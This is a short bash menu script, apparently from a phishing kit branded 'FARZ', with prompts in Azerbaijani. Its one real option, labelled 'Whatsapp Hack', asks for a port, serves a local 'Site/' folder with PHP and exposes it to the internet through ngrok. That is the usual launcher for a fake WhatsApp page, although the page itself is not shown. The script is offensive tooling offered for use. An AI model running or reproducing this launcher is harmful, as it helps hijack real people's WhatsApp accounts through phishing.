#!/bin/bash

clear
echo -e '\033[32;40;1m
      ███████╗ █████╗ ██████╗ ███████╗
      ██╔════╝██╔══██╗██╔══██╗╚══███╔╝
      █████╗  ███████║██████╔╝  ███╔╝ 
      ██╔══╝  ██╔══██║██╔══██╗ ███╔╝  
      ██║     ██║  ██║██║  ██║███████╗
      ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝



\033[31;40;1m[01]\e[37mWhatsapp Hack 


\e[31m[00]\e[37m Menyu
\e[31m[99]\e[37m Çıxış

 '
echo -e "\033[32;40;1m                      ~~~Nihat 「 FARZ 」~~~"
echo ""
read -p "Seçim Edin : " islem
if [[ $islem == 1 || $islem == 01 ]]; then
read -p "Port Nömrəsi Girin : " port
sleep 3
echo ""
echo -e "\e[33mCode: whatsapp01"
sleep 2
echo ""
echo -e "\e[33mPhp Server && Ngrok Service Başladılır..."
sleep 4
cd Site/
php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 9 || $islem == 99 ]]; then
clear
echo -e "\e[31mKanalımızı İzləmədə qalın @MaragliWeb :)) ßß"
sleep 1 
exit 1
elif [[ $islem == 00 ]]; then
cd ..
cd ..
bash farz.sh
else 
	echo -e '\033[31;40;1m Seçiminizi düzgün edin!'
	sleep 2
	clear
	bash start.sh
fi
